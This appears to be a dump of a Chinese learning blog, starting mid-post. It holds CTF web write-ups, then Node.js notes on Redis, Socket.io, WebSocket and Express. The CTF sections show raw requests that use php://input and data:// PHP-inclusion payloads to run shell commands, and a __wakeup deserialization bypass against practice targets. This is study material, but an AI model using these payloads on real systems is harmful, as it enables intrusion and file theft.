$page);&#125;include($page);?&gt; 这题解法很多样的样子，看看wp能得到很多操作 大小写绕过php://这里php://不分大小写，代码中只做了小写判定，所以我们可以大小写绕过 burp拦截头信息 – proxy – interccept =&gt;(获取到头信息后) Actions – send to repeater 123456789GET / HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 修改头信息123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 22&lt;?php system(&quot;ls&quot;); ?&gt; output 123fl4gisisish3r3.phpindex.phpphpinfo.php 访问fl4gisisish3r3.php： 123456789101112POST /?page=Php://input HTTP/1.1Host: 220.249.52.133:40787Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 42&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 得到了flag 使用其他协议data://修改头信息(拦截见上)12http://220.249.52.133:40787/?page=data://text/plain;base64,%0CPD9waHAgc3lzdGVtKCdscycpOyA/Pg== # &lt;?php system(&quot;ls&quot;); ?&gt; 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8+# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 这时候出问题了 url中的特殊符号我们需对url中的特殊符号(+, (空格), )进行url编码来传数据 12http://220.249.52.133:40787/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmw0Z2lzaXNpc2gzcjMucGhwJyk7ID8%2b# &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt; 在html注释get到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-01","date":"2020-10-01T13:25:00.000Z","path":"2020/10/01/coding/ctf/ctf笔记-01/","text":"写在前面： 此笔记系个人(初学者)整理思路之用，没有想过能起到供各位参考学习的用处。 尽可能按照攻防世界的题目顺序来。 如果各位从我的文章发现了什么问题或者想和我探tan讨tan探ren讨sheng，欢迎联系我呀~ baby_web​ 进入页面之后，重定向到了1.php，认为有问题，因此使用了网页搜索工具dirsearch dirsearch1python dirsearch.py -u http://220.249.52.133:40885 -e* output: 12345678910111213[19:22:07] 403 - 306B - /.htaccess.bak1[19:22:07] 403 - 306B - /.htaccess.orig[19:22:07] 403 - 308B - /.htaccess.sample[19:22:07] 403 - 306B - /.htaccess.save[19:22:07] 403 - 304B - /.htaccessBAK[19:22:07] 403 - 304B - /.htaccessOLD[19:22:07] 403 - 305B - /.htaccessOLD2[19:22:07] 403 - 303B - /.httr-oauth[19:22:15] 200 - 11B - /1.php[19:23:08] 302 - 17B - /index.php -&gt; 1.php[19:23:08] 302 - 17B - /index.php/login/ -&gt; 1.php[19:23:30] 403 - 305B - /server-status[19:23:30] 403 - 306B - / 发现了奇怪的302信息：/index，去路由到/index康康，发现302的response中有flag，结题 Training-WWW-Robots​ 看题目知道，是关于robots.txt的,因此我们可以直接访问robots.txt路由/robots.txt robots.txt​ output: 123456User-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: * 看到了类似于flag的路由，过去直接发现路由 unserialize3​ 根据题目来看，这题是关于反序列化的 ​ 访问地址： 123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= ​ 发现这php语法错误，少一括号看到了?code=，察觉到是get传参code，应该是传序列化的类，之后番序列化出flag ​ 我们把这个类序列化： 12345678910&lt;?phpclass xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests'); &#125;&#125;$b = new xctf();$c = serialize($b);echo $c; output 1O:4:\"xctf\":1:&#123;s:4:\"flag\";s:3:\"111\";&#125; 我们直接写入code参数中: 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; output 1bad requests 这时意识到了，经过了反序列化经过了__wakeup()魔术方法，导致了bad requests被打印出来。 如何绕过php反序列化的__wakeup()方法呢？ 在反序列化的操作中，如果给出的参数数量和真正的参数数量对不上，则会跳过__wakeup()方法 例如，O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;},我们若改成：O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，给出的参数数量为2，可实际只有一个，就会绕过导致__wakeup()方法 重新路由： 1http://220.249.52.133:32505/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125; 拿到了flag","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"12.Redis","date":"2020-09-29T11:21:24.000Z","path":"2020/09/29/coding/nodeJs/12. redis/","text":"Redis1. 介绍(抄自菜鸟教程) REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 特点 基于内存，可持久化 &gt; 快速 可存键值对，数据结构 &gt; 算法透明(开源) 具有多语言支持 2. 数据类型 - 控制台使用演示 更多指令见菜鸟教程 string12345set key valueget keydel key 一个键最大能存储 512MB。 hash1234567hset obj key value //redis[&quot;obj&quot;].key = valuehmset obj key1 value1 [key2 value2 ...]hget obj keyhmget obj key1 [key2] 每个 hash 可以存储 232 -1 键值对（40多亿） list123l(r)push listName value1 [value2 ...]l(r)pop listName 列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿) set 无序集合 123sadd setName value1 [value2 ...]smembers runoob 集合中最大的成员数为 2^32 - 1 (4294967295, 每个集合可存储40多亿个成员) zset 有序集合 skiplist 通俗易懂 ziplist顺序数据结构，适用数据集较小时 123zadd zsetName score(double) value1 [value2 ...]zrangebyscore zsetName min max //[min, max] HyperLogLog 基数计数 Btree(各位大佬们都学过了) bitmap 比较：Btree对于合并操作的时间复杂度不如bitmap，但是bitmap的空间复杂度为$O(max{a_{n}})$ 12345pfadd hllName value [value ...]pfcount hllName [hllName ...]pfmerge destkey sourcekey [sourcekey ...] redis 持久化 将内存存入硬盘的策略 RDB以snapshot形式，每隔特定时间间隔将数据集快照写入磁盘 save触发(abandoned) ​ 执行save期间，阻塞redis bgsave触发 ​ 非阻塞，fork出程序 配置触发条件 ​ 由系统决定 save ​ save m n m秒内数据集存在n次修改时，自动触发bgsave ​ 启用RDB后默认启用 默认配置: save 900 1 &amp;&amp; save 300 10 &amp;&amp; save 60 10000 (并发执行) stop-weites-on-bgsave-error ​ 启用RDB后默认启用，当后台保存数据失败时， rdbcompression ​ 启用RDB后默认启用，压缩存储快照LZF rdbchecksum ​ 启用RDB后默认启用，存取快照后使用CRC64进行数据校验 dbfilename ​ 设置快照的文件名 dir ​ 快照的存放路径 (照抄网上) ①、优势 （1）RDB文件紧凑，全量备份，非常适合用于进行备份和灾难恢复。 （2）生成RDB文件的时候，redis主进程会fork()一个子进程来处理所有保存工作，主进程不需要进行任何磁盘IO操作。 （3）RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 ②、劣势 RDB快照是一次全量备份，存储的是内存数据的二进制序列化形式，存储上非常紧凑。当进行快照持久化时，会开启一个子进程专门负责快照持久化，子进程会拥有父进程的内存数据，父进程修改内存子进程不会反应出来，所以在快照持久化期间修改的数据不会被保存，可能丢失数据。 AOF以log形式，将一个个的命令记录入文件 always ​ 同步日志 everysec ​ 每秒记录(同一秒内宕机，一秒间的数据丢失) no ​ 不可控，从不同步(依赖os的写入) (照抄) 1、优点 （1）AOF可以更好的保护数据不丢失，一般AOF会每隔1秒，通过一个后台线程执行一次fsync操作，最多丢失1秒钟的数据。（2）AOF日志文件没有任何磁盘寻址的开销，写入性能非常高，文件不容易破损。 （3）AOF日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。 （4）AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用flushall命令清空了所有数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令给删了，然后再将该AOF文件放回去，就可以通过恢复机制，自动恢复所有数据 2、缺点 （1）对于同一份数据来说，AOF日志文件通常比RDB数据快照文件更大 （2）AOF开启后，支持的写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，当然，每秒一次fsync，性能也还是很高的 （3）以前AOF发生过bug，就是通过AOF记录的日志，进行数据恢复的时候，没有恢复一模一样的数据出来。 文件重写 防止文件过大，使用bgreweiteaof，将内存中的数据以命令方式保存到临时文件，同时fork出一条新进程将文件重写 可以减小log的体积(减少不必要的命令，压缩可以压缩的命令) laravel配置 php的redis扩展 使用1redis::somecommand //redis的命令","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"11.Socket.io","date":"2020-09-29T11:16:24.000Z","path":"2020/09/29/coding/nodeJs/11. socket.io/","text":"Socket.io 提供了很好的灵活性，并非完全基于WebSocket =&gt; 可以在大多数设备上运行 聊天程序初始化程序123456789&#123; \"name\": \"chat.io\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"body-parser\": \"^1.19.0\", \"express\": \"^4.17.1\", \"socket.io\": \"^2.3.0\" &#125;&#125; 构建服务器123456789101112131415161718/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123;extended: true&#125;));app.listen(3000); 将Socket.io绑定到服务器上 12345var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected');&#125;) 构建客户端public/index.html 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"message\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; public/chat.js 12345window.onload = function() &#123; //本例中，因为没有传递参数给io.connect，所以，它会尝试向页面所在的主机发起连接 //socket.io会使用适合当前浏览器的最优选择进行socket连接 var socket = io.connect();&#125; 事件与广播广播中加入用户信息public/chat.css 1234#chat &#123; /*将聊天窗口隐藏，登录后显示*/ display: none;&#125; public/chat.js 123456socket.on('connect', function () &#123; //通过join事件发送昵称 socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block';&#125;) server.js 12345678io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;);&#125;); 广播聊天信息public/chat.js 12345678910111213141516171819202122232425262728293031323334353637383940window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; //通知其他用户信息的事件 socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); //添加消息(li)元素 function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; //添加用户自身的信息 addMessage('me', input.value); socket.emit('text', input.value); input.value = ''; input.focus(); return false; &#125; //addMessage是 text-接收 事件的响应回调函数 socket.on('text', addMessage);&#125; server.js 123456789101112131415161718192021222324252627282930313233343536/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给除了自己以外所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg) &#123; //第一个参数是事件名，后面的参数都是给回调函数的 socket.broadcast.emit('text', socket.nickname, msg); &#125;);&#125;);httpServer.listen(3000); 改进用户体验，增加反馈server.js 12345678910111213141516171819202122232425262728293031323334353637/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); //确认事件已接收 fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); public/char.js 123456789101112131415161718192021222324252627282930313233343536373839404142window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage);&#125; 轮流做DJ - 聊天程序扩展需求 服务器初始选择一名DJ DJ有权利请求 查询API，获取查询结果，选择一首歌，然后将这首歌广播给所有其他听众 当DJ离开时，系统会开放DJ人选 给下一名用户 扩展聊天应用server,js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect (socket) &#123; dj = socket; //向所有人发出通知 -- 注意区别 io.sockets.emit('announcement', socket.nickName + ' is the new dj'); //向单个用户发出通知 -- 注意区别 socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //向除了这个用户以外的其他人发送通知 -- 注意区别 socket.broadcast.emit('announcement', name + ' joined the chat.'); if(!dj) &#123; //如果没有dj就选择一名dj elect(socket); &#125; else &#123; //如果dj正在搓碟就向这个用户发送目前的歌名 socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); puiblic/index.html 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"playing\"&gt;&lt;/div&gt; &lt;form id=\"dj\"&gt; &lt;h3&gt;Search songs&lt;/h3&gt; &lt;input type=\"text\" id=\"s\" /&gt; &lt;ul id=\"results\"&gt;&lt;/ul&gt; &lt;button type=submit&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"messages\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 集成Grooveshark API(由于不能翻墙，所以不能测试代码的正确性) 添加superagent 1npm install superagent server.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http'), request = require('superagent');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;var apiKey = '&#123;your API key&#125;';/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect(socket) &#123; dj = socket; io.sockets.emit('announcement', socket.nickName + ' is the new dj'); socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function (name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); if (!dj) &#123; elect(socket); &#125; else &#123; socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;); //搜索的功能(事件分发) socket.on('search', function (q, fn) &#123; request('http://tinysong.com/s/' + encodeURIComponent(q) + '?key=' + apiKey + '&amp;format=json', function (res) &#123; if (200 == res.status) fn(JSON.parse(res.text)); &#125;); &#125;); //通知其他人正在播放的歌曲 socket.on('song', function () &#123; if (socket.dj) &#123; currentSong = song; socket.broadcast.emit('song', song); &#125; &#125;);&#125;);httpServer.listen(3000); public/chat.css 1234567#results a &#123; display: none;&#125;form.isDJ #results a &#123; display: none;&#125; public/chat.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage(from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage); //search form var form = document.getElementById('dj'); var results = document.getElementById('results'); form.style.display = 'block'; form.onsubmit = function () &#123; results.innerHTML = ''; socket.emit('search', document.getElementById('s').value, function (songs) &#123; for (var i = 0, l = songs.length; i &lt; l; i++) &#123; (function (song) &#123; var result = document.createElement('li'); result.innerHTML = song.ArtistName + ' - &lt;b&gt;' + song.SongName + '&lt;/b&gt; '; var a = document.createElement('a'); a.href = '#'; a.innerHTML = 'Select'; a.onclick = function () &#123; socket.emit('song', song); play(song); return false; &#125;; result.appendChild(a); results.appendChild(result); &#125;)(song[i]); &#125; &#125;); return false; &#125;; socket.on('elected', function () &#123; form.className = 'isDJ'; &#125;); var playing = document.getElementById('playing'); function play(song) &#123; if(!song) return; playing.innerHTML = '&lt;hr&gt;&lt;b&gt;Now Playing: &lt;/b&gt; ' + song.ArtistName + ' ' + song.SongName + '&lt;br&gt;'; var iframe = document.createElement('iframe'); iframe.frameborder = 0; iframe.src = song.Url; playing.appendChild(iframe); &#125;&#125;","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"10.WebSocket","date":"2020-09-29T11:15:24.000Z","path":"2020/09/29/coding/nodeJs/10. WebSocket/","text":"WebSocket注解：书中使用的WebSocket.io已经是8年未动的过时项目了，因此这里的所有内容使用的均为ws 使用ws模块 客户端 12345678910//WebSocket实例化var ws = new WebSocket(\"ws://localhost:8181\");ws.onopen = function (e) &#123; //成功连接服务器回调 console.log('客户端（client）：与服务器的连接已打开')&#125;function sendMessage() &#123; ws.send($('#message').val());&#125;; 服务端 12345678var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123;port: 8181&#125;);wss.on('connection', function (ws) &#123; console.log('服务器端：客户端已连接'); ws.on('message', function(message) &#123; console.log(message); &#125;);&#125;); 一个ECHO实例初始化项目package.json 12345678910&#123; \"name\": \"ws-echo\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"bufferutil\": \"^4.0.1\", \"express\": \"*\", \"utf-8-validate\": \"^5.0.2\", \"ws\": \"*\" &#125;&#125; 服务端这里的ws服务器与express服务器是两个端口，其之间是分离的 123456789101112131415161718192021222324252627282930var express = require('express');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; port: 3000&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96mgot:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);/** * 监听端口 */app.listen(8080); 客户端1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;WebSocket echo test&lt;/title&gt; &lt;script&gt; var lastMessage;//储存延时的变量 window.onload = function () &#123; //创建socket var ws = new WebSocket('ws://localhost:3000'); //建立第一次连接时触发 ws.onopen = function () &#123; //发送第一条pong ping(); &#125;; //返回数据时触发 //计算延时，并且再发出一条信息 ws.onmessage = function (ev) &#123; console.log(' got: ' + ev.data); //获得返回数据，测量延迟 document.getElementById('latency').innerHTML = new Date - lastMessage; //ping again ping(); &#125; function ping() &#123; //记录时间戳 lastMessage = +new Date; //发送消息 ws.send('ping'); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;WebSocket Echo&lt;/h1&gt; &lt;h2&gt;Latency: &lt;span id=\"latency\"&gt;&lt;/span&gt;ms&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 自制-共享端口123456789101112131415161718192021222324252627282930313233343536373839var express = require('express');var http = require('http');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; noServer: true&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96m got:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);var server = http.createServer(app);//socket是http的更高一层，所以使用upgrade事件server.on('upgrade', function upgrade(req, socket, head) &#123; console.log(\"received\"); wss.handleUpgrade(req, socket, head, function done (ws) &#123; wss.emit('connection', ws, req); &#125;)&#125;)/** * 监听端口 */server.listen(3000);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"9.Express","date":"2020-09-29T11:14:24.000Z","path":"2020/09/29/coding/nodeJs/9. express/","text":"Express一个小型express应用创建模块123456789&#123; \"name\": \"express-tweet\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"express\": \"*\", \"ejs\": \"*\", \"superagent\": \"*\" &#125;&#125; ejs./view/index.ejs 1234567&lt;h1&gt;Twitter app&lt;/h1&gt;&lt;p&gt;Please enter your search term:&lt;/p&gt;&lt;form action=&quot;/search&quot; method = &quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;q&quot; /&gt; &lt;button&gt;SEARCH&lt;/button&gt;&lt;/form&gt; ./view/search.ejs 1234567891011&lt;h1&gt;Tweet results for &lt;%= search %&gt;&lt;/h1&gt;&lt;!--我们将JavaScript代码嵌在标签中，通过在标签之后加入=来将变量值打印出来--&gt;&lt;% if (results.length) &#123; %&gt; &lt;ul&gt; &lt;% for (var i = 0; i &lt; results.length; i++) &#123; %&gt; &lt;li&gt;&lt;%= results[i].text %&gt; - &lt;em&gt;&lt;%= results[i].from_user %&gt;&lt;/em&gt;&lt;/li&gt; &lt;% &#125; %&gt; &lt;/ul&gt;&lt;% &#125; else &#123; %&gt; &lt;p&gt;No results&lt;/p&gt;&lt;% &#125; %&gt; jsserver.js 12345678910111213141516171819202122232425262728293031323334/** * 模块依赖 */var express = require(&apos;express&apos;);//创建服务 - 自己修改过，书上是老版本的用法var app = express();//指定模板引擎app.set(&apos;view engine&apos;, &apos;ejs&apos;);//指定视图文件所在的路径app.set(&apos;views&apos;, __dirname + &apos;/views&apos;);//视图文件选项app.set(&apos;view options&apos;, &#123;layout: false&#125;);/** * 路由 */app.get(&apos;/&apos;, function(req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render(&apos;index&apos;);&#125;)/** * 监听 */app.listen(3000); 路由example 123456789101112131415161718192021222324//路由示例app.get('/', function (req, res, next)&#123; //sth&#125;)//:name 匹配参数，id值不同也能匹配到app.put('/post/:name', function (req, res, next)&#123; //sth&#125;)app.post('/signup', function (req, res, next)&#123; //sth&#125;)app.del('/user/:id', function (req, res, next)&#123; //sth&#125;)app.patch('/user/:id', function (req, res, next)&#123; //sth&#125;)app.head('/user/:id', function (req, res, next)&#123; //sth&#125;) 查询路由 123456789101112var search = require('./search');/*...*/app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 